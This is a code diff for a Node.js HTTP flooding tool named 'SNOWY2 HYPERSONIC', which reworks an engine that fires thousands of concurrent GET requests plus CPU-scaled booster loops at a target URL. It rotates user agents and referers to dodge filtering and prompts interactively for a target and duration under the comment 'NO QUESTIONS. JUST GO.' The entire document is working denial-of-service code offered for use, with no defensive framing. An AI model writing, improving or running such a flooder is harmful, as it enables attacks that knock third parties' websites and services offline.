@@ -4,22 +4,13 @@ const os = require('os');
 const http = require('http');
 const https = require('https');
 const process = require('process');
-const pLimit = require('p-limit').default;
 
-const TARGET = process.argv[2];
-const DURATION = parseInt(process.argv[3]) * 1000;
+const FIXED_CONCURRENCY = 3000;
+const CPU_COUNT = os.cpus().length;
+const REQUEST_TIMEOUT = 8000;
 
-if (!TARGET || isNaN(DURATION)) {
-    console.log('Usage: node attack.js <url> <timeSec>');
-    process.exit(1);
-}
-
-const USER_AGENTS = loadLines('ua.txt');
 const REFERERS = loadLines('refs.txt');
-
-const MAX_CONCURRENT = 2000;
-const BOOST_THREADS = 32;
-const REQUEST_TIMEOUT = 10000;
+const USER_AGENTS = loadLines('ua.txt');
 
 const httpAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
 const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity });
@@ -44,15 +35,16 @@ function randIp() {
 }
 
 class AttackEngine {
-    constructor() {
-        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
-        this.limit = pLimit(MAX_CONCURRENT);
+    constructor(target, duration) {
+        this.target = target;
+        this.duration = duration * 1000;
         this.startTime = Date.now();
-        this.effects = ['💣', '⚡', '🔥', '💥', '🚀'];
+        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
+        this.fx = ['⚡', '🚀', '💣', '🔥', 'BLAST', 'ZAP', 'RUSH', '⚔️', '⚙️'];
         this.fxIndex = 0;
     }
 
-    async makeRequest() {
+    async fireRequest() {
         const headers = {
             'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
             'Referer': randItem(REFERERS, 'https://google.com'),
@@ -60,38 +52,35 @@ class AttackEngine {
         };
 
         try {
-            await axios.get(TARGET, {
+            await axios.get(this.target, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
                 httpAgent,
                 httpsAgent,
                 maxRedirects: 0,
-                validateStatus: null
+                validateStatus: null,
+                decompress: false
             });
-            return 'SUCCESS';
+            return true;
         } catch {
-            return 'ERROR';
+            return false;
         }
     }
 
-    displayStats() {
-        const elapsed = (Date.now() - this.startTime) / 1000;
-        const rps = (this.stats.total / elapsed).toFixed(1);
-        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
-        const fx = this.effects[this.fxIndex++ % this.effects.length];
-        process.stdout.write(
-            `\r${fx} RPS: ${rps} | HITS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
-        );
+    async boosterThread() {
+        while (Date.now() - this.startTime < this.duration) {
+            const res = await this.fireRequest();
+            this.stats.total++;
+            res ? this.stats.success++ : this.stats.errors++;
+        }
     }
 
-    async runLoop() {
-        const batch = Array.from({ length: MAX_CONCURRENT }, () =>
-            this.limit(() => this.makeRequest())
-        );
+    async fixedFloodWave() {
+        const batch = Array.from({ length: FIXED_CONCURRENCY }, () => this.fireRequest());
         const results = await Promise.allSettled(batch);
         results.forEach(res => {
             this.stats.total++;
-            if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
+            if (res.status === 'fulfilled' && res.value) {
                 this.stats.success++;
             } else {
                 this.stats.errors++;
@@ -99,50 +88,66 @@ class AttackEngine {
         });
     }
 
-    async runBoostLoop() {
-        while (Date.now() - this.startTime < DURATION) {
-            await this.makeRequest();
-        }
+    displayLive() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const rps = (this.stats.total / elapsed).toFixed(1);
+        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
+        const fx = this.fx[this.fxIndex++ % this.fx.length];
+        process.stdout.write(`\r${fx} RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`);
     }
 
-    async runAttack() {
-        const statInterval = setInterval(() => this.displayStats(), 100);
+    async run() {
+        console.log(`\nSNOWY2 HYPERSONIC - ${FIXED_CONCURRENCY} CONC + BOOST x${CPU_COUNT * 2}`);
+        console.log('='.repeat(60));
+        console.log(`TARGET: ${this.target}`);
+        console.log(`DURATION: ${this.duration / 1000}s`);
+        console.log('='.repeat(60));
 
+        const statTicker = setInterval(() => this.displayLive(), 100);
         const boosters = [];
-        for (let i = 0; i < BOOST_THREADS; i++) {
-            boosters.push(this.runBoostLoop());
+
+        for (let i = 0; i < CPU_COUNT * 2; i++) {
+            boosters.push(this.boosterThread());
         }
 
-        while (Date.now() - this.startTime < DURATION) {
-            await this.runLoop();
+        while (Date.now() - this.startTime < this.duration) {
+            await this.fixedFloodWave();
         }
 
-        clearInterval(statInterval);
-        process.stdout.write('\n');
+        clearInterval(statTicker);
         await Promise.allSettled(boosters);
-        this.printSummary();
+        this.printResults();
     }
 
-    printSummary() {
+    printResults() {
         const elapsed = (Date.now() - this.startTime) / 1000;
         const avgRps = (this.stats.total / elapsed).toFixed(1);
-        console.log('\n\nATTACK COMPLETE');
+        console.log('\n\nATTACK COMPLETED');
         console.log('='.repeat(60));
-        console.log(`TARGET: ${TARGET}`);
-        console.log(`TIME: ${elapsed.toFixed(1)}s`);
-        console.log(`TOTAL: ${this.stats.total}`);
-        console.log(`SUCCESS: ${this.stats.success}`);
+        console.log(`TOTAL REQUESTS: ${this.stats.total}`);
+        console.log(`SUCCESS (200): ${this.stats.success}`);
         console.log(`ERRORS: ${this.stats.errors}`);
-        console.log(`AVG RPS: ${avgRps}`);
+        console.log(`AVERAGE RPS: ${avgRps}`);
         console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
         console.log('='.repeat(60));
     }
 }
 
-// MAIN
+// NO QUESTIONS. JUST GO.
 (async () => {
-    console.log('\nSNOWY3 - MADMODE ACTIVE');
-    console.log('='.repeat(60));
-    const engine = new AttackEngine();
-    await engine.runAttack();
+    const readline = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+
+    const ask = q => new Promise(res => readline.question(q, res));
+    let target = await ask("TARGET: ");
+    if (!target.startsWith("http")) target = "http://" + target;
+    const time = parseInt(await ask("TIME (seconds): "));
+    readline.close();
+
+    if (isNaN(time)) return console.log("Invalid time.");
+
+    const engine = new AttackEngine(target.trim(), time);
+    await engine.run();
 })();
